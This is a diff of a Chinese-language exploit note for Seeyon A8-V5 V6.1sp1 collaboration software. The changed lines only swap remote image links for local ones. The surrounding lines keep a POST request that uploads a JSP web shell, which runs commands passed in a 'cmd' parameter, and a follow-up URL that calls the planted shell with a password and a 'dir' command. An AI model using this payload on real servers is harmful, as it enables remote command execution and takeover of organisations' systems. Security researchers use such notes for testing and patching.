@@ -30,7 +30,7 @@ title="致远A8-V5协同管理软件 V6.1sp1"
 
 出现如下图响应，则可能含有漏洞
 
-![image-20220520153223889](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201532921.png)
+![image-20220520153223889](./images/202205201532921.png)
 
 使用POST请求发出如下请求包
 
@@ -49,7 +49,7 @@ originalCreateDate=wLSGP4oEzLKAz4=iz=66
 <pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
 ```
 
-![image-20220520153242842](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201532919.png)
+![image-20220520153242842](./images/202205201532919.png)
 
 出现如图响应则为上传成功,访问
 
@@ -57,4 +57,4 @@ originalCreateDate=wLSGP4oEzLKAz4=iz=66
 /seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir
 ```
 
-![image-20220520153301492](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201533547.png)
+![image-20220520153301492](./images/202205201533547.png)
